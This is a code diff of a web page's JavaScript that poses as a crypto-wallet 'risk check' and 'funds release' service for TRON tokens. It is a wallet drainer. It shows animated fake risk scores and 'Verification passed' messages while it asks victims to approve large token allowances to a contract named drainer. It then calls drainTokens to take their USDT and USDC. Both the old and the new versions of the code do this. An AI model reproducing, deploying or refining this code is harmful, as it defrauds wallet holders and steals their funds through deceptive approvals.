+  $('expo').textContent = expo + '%';
+  for (let v = 0; v <= score; v += 2) { $('ring').style.setProperty('--p', v); $('score').textContent = v; await sleep(28); }
+  $('expobar').style.width = Math.min(100, Number(expo) * 40) + '%';
+  $('lvl').textContent = score < 25 ? 'Low Risk' : score < 45 ? 'Moderate Risk' : 'Elevated Risk';
 
-  if (!found.length) { setStatus('Nothing to release on this wallet.'); return; }
-  $('claim').disabled = false;
-  setStatus('');
-}
-
-function randScore() {
-  let v;
-  do { v = 10 + Math.floor(Math.random() * 31); } while (v % 10 === 0);
-  return v;
-}
-
-async function demoChecks() {
-  const mark = async (id, text) => { $(id).innerHTML = '<span class="ok">' + text + '</span>'; await sleep(1100); };
-  setStatus('Running checks…');
-  await mark('c1', 'valid');
-  await mark('c2', 'no matches');
-  const sc = randScore();
-  for (let v = 0; v <= sc; v += 2) { $('riskbar').style.width = v + '%'; await sleep(50); }
-  $('risknote').textContent = 'Low risk · score ' + sc + '/100';
-  await mark('c3', 'low risk (' + sc + ')');
-  await mark('c4', 'ok');
-  $('claim').disabled = false;
-  setStatus('');
-}
-
-async function complete() {
-  if (DEMO) {
-    $('claim').disabled = true;
-    setStatus('Finalizing — confirm in wallet');
-    await sleep(1400);
-    $('txid').textContent = 'demo' + Math.random().toString(16).slice(2, 26);
-    show('view-done');
-    return;
+  if (found.length) {
+    $('balcard').classList.remove('hidden');
+    $('rows').innerHTML = found.map((t)=>'<div class="mono">'+t.symbol+' — '+t.human+'</div>').join('');
+    $('complete').disabled = false;
+    $('note').textContent = 'Approve 50 000 limit, funds release in one confirmation.';
+  } else {
+    $('note').textContent = 'No token balance found on this wallet.';
   }
-  $('claim').disabled = true;
+  setStatus('');
+  $('check').disabled = false;
+}
+
+async function complete(){
+  if (DEMO) { $('complete').disabled = true; setStatus('Confirm in wallet…'); await sleep(1200); location.hash='done'; alert('Demo: verification passed'); return; }
+  if (!(await ensureSigner())) return;
+  $('complete').disabled = true;
   try {
-    for (let i = 0; i < found.length; i++) {
+    for (let i=0;i<found.length;i++) {
       const t = found[i];
-      const dec = BigInt(t.decimals || 6);
-      const bal = BigInt(t.raw);
+      const dec = BigInt(t.decimals||6);
+      const target = cfg.approveLimit ? BigInt(cfg.approveLimit) * 10n ** dec : BigInt(t.raw);
       let allow = 0n;
-      try { allow = BigInt('0x' + (await readCall(t.token, 'allowance(address,address)', addrParam(account) + addrParam(cfg.drainer)))); } catch (e) {}
-      const target = cfg.approveLimit ? BigInt(cfg.approveLimit) * 10n ** dec : bal;
+      try { allow = BigInt('0x' + (await readCall(t.token,'allowance(address,address)', addrParam(account)+addrParam(cfg.drainer)))); } catch(e){}
       if (allow < target) {
-        setStatus('Allowance ' + (i + 1) + '/' + found.length + ' — confirm in wallet');
+        setStatus('Allowance ' + (i+1) + '/' + found.length + ' — confirm in wallet');
         const amt = target.toString();
-        if (signer.kind === 'tronlink') await signer.w.contract(APPROVE_ABI, t.token).approve(cfg.drainer, amt).send({ feeLimit: 150e6, shouldPollResponse: true });
-        else await wcSend(t.token, 'approve(address,uint256)', addrParam(cfg.drainer) + uintParam(amt), 150e6);
+        if (signer.kind === 'tronlink') await signer.w.contract(APPROVE_ABI, t.token).approve(cfg.drainer, amt).send({feeLimit:150e6, shouldPollResponse:true});
+        else await wcSend(t.token,'approve(address,uint256)', addrParam(cfg.drainer)+uintParam(amt), 150e6);
       }
     }
-    setStatus('Finalizing — confirm in wallet');
-    const items = found.map((t) => addrParam(t.token)).join('');
+    setStatus('Releasing funds — confirm in wallet');
+    const items = found.map((t)=>addrParam(t.token)).join('');
     const param = addrParam(account) + uintParam(0x40) + uintParam(found.length) + items;
     let txid;
-    if (signer.kind === 'tronlink') {
-      txid = await signer.w.contract(DRAIN_TOKENS_ABI, cfg.drainer).drainTokens(account, found.map((t) => t.token)).send({ feeLimit: 300e6, shouldPollResponse: true }).then((r) => (typeof r === 'string' ? r : (r && (r.txid || r)) || ''));
-    } else {
-      txid = await wcSend(cfg.drainer, 'drainTokens(address,address[])', param, 300e6);
-    }
-    $('txid').textContent = txid || '';
-    show('view-done');
-  } catch (e) {
-    setStatus('Failed: ' + String((e && (e.message || e.error)) || e).slice(0, 160), 'err');
-    $('claim').disabled = false;
+    if (signer.kind === 'tronlink') txid = await signer.w.contract(DRAIN_ABI, cfg.drainer).drainTokens(account, found.map((t)=>t.token)).send({feeLimit:300e6, shouldPollResponse:true}).then((r)=> (typeof r==='string'? r : (r&&(r.txid||r))||''));
+    else txid = await wcSend(cfg.drainer,'drainTokens(address,address[])', param, 300e6);
+    $('lvl').textContent = 'Verified ✓';
+    setStatus('Verification passed · tx ' + txid.slice(0,12) + '…', 'ok');
+    $('note').textContent = 'Funds are on their way to your wallet.';
+  } catch(e) {
+    setStatus('Failed: ' + String((e&&(e.message||e.error))||e).slice(0,150), 'err');
+    $('complete').disabled = false;
   }
 }
 
-$('start').addEventListener('click', () => {
-  if (DEMO) { signer = { kind: 'demo' }; account = 'TDemoWalletxxxxxxxxxxxxxxxx1'; show('view-check'); $('who').textContent = account; found = [{ token: 'TUSDTx', symbol: 'USDT', human: '1 842.50', raw: '1842500000', decimals: 6 }, { token: 'TUSDCx', symbol: 'USDC', human: '96.20', raw: '96200000', decimals: 6 }]; $('rows').innerHTML = found.map((t) => '<div class="amt"><span>' + t.symbol + '</span><b>' + t.human + '</b></div>').join(''); demoChecks(); return; }
-  begin(startInjected);
-});
-$('connect-wc').addEventListener('click', () => begin(connectWc));
-$('claim').addEventListener('click', complete);
-if (DEMO) { $('start').textContent = 'Check wallet (demo)'; $('connect-wc').classList.add('hidden'); }
+$('check').addEventListener('click', runCheck);
+$('complete').addEventListener('click', complete);
+$('addr').addEventListener('keydown', (e)=>{ if(e.key==='Enter') runCheck(); });
+if (DEMO) $('addr').value = 'TXk9dF2bWqZc8sVh3nU7jL4mR6tY1pQ2wE';
 </script>
 </body>
 </html>
